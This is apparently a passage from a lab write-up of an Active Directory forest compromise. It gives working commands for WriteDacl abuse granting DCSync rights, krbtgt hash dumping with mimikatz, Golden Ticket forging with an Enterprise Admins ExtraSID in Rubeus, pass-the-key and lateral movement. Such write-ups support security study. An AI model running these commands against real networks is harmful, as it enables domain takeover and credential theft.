After compromising `gcbacc.example` (host `acc-data`) and `msp.example` (host `msp-dc01`), two secrets labeled `escrow*` were identified. These secrets contain fragments of a password that, when combined, reconstruct a potentially valid credential within the environment.

```powershell
# Recovered secrets
REDACTED_SECRET
REDACTED_SECRET

# Reconstructed credential
REDACTED_SECRET
```

At this point, control had been established over `gcbfinance.example`, `msp.example`, `gcbsec.example`, and `gcbacc.example`. The domains `it.gcb.example` and the forest root `gcb.example` were not yet compromised — making them the logical next target for this reconstructed credential.

During `it.gcb.example` enumeration, the user `orgadmin` was found to have `WriteDacl` over the domain object. Given this privilege level, the reconstructed credential was tested against `orgadmin` — a valid match would allow modifying domain ACLs and escalating via DCSync rights delegation.

## ATTACK CHAIN

`escrow*` credentials → password reconstruction → `orgadmin` account compromised (`Organization Admins`) → `WriteDacl` over `it.gcb.example` → ACL modification for persistent control → DCSync rights delegated → domain credentials extracted → Golden Ticket with ExtraSID (Enterprise Admins) → intra-forest escalation → full forest compromise → access to `GCB-WSUS`

## EXPLOITATION

#### 1. Establish Authenticated Context with Compromised Credentials

```powershell
runas /netonly /user:it\orgadmin cmd.exe
# REDACTED_SECRET
```

> `/netonly` creates a new console where network authentications are performed as `IT\orgadmin` while keeping the local context unchanged. `Organization Admins` holds `WriteDacl` over the domain object, enabling ACL modification to delegate critical privileges such as directory replication.

#### 2. WriteDACL Abuse — Delegate DCSync Rights

```powershell
Add-DomainObjectAcl -TargetIdentity "DC=it,DC=gcb,DC=local" -PrincipalIdentity IT\orgadmin -Rights DCSync -Verbose
```

#### 3. DCSync against it.gcb.example

```powershell
.\mimikatz.exe "lsadump::dcsync /domain:it.gcb.example /user:krbtgt" "exit"
# krbtgt
# REDACTED_HASH
# REDACTED_HASH
```

> The KRBTGT hash enables generation of arbitrary Kerberos tickets within the domain.

#### 4. Golden Ticket with ExtraSID

A Golden Ticket is forged with the `Enterprise Admins` SID included in the `sids` parameter, enabling forest-level privilege escalation.

```powershell
.\Rubeus.exe golden /user:Administrator /domain:it.gcb.example /sid:S-1-5-21-948911695-1962824894-4291460450 /sids:S-1-5-21-2781415573-3701854478-2406986946-519 /aes256:REDACTED_SECRET /ptt

# Verify access to both DCs
ls \\it-dc\c$
ls \\gcb-dc\c$
```

> `/ptt` injects the ticket directly into memory. Signed with the KRBTGT key, it is validated as legitimate by the Domain Controller. The Enterprise Admins SID grants forest-wide administrative privileges.

#### 5. DCSync against the Forest Root (gcb.example)

```powershell
.\mimikatz.exe "lsadump::dcsync /domain:gcb.example /user:gcb\administrator /dc:gcb-dc.gcb.example" "exit"
# NTLM : REDACTED_HASH
# AES  : REDACTED_HASH
```

#### 6. Request Legitimate TGT (Pass-the-Key)

```powershell
.\Rubeus asktgt /user:administrator /ntlm:REDACTED_SECRET /domain:gcb.example /ptt
```

> Ticket injected into memory — Domain Admin authentication in `gcb.example` is now available.

#### 7. Lateral Movement to GCB-WSUS

```powershell
Enter-PSSession -ComputerName gcb-wsus.gcb.example
```

> Successful access confirms effective administrative control over the forest root, enabling extraction of additional credentials and further expansion of access.
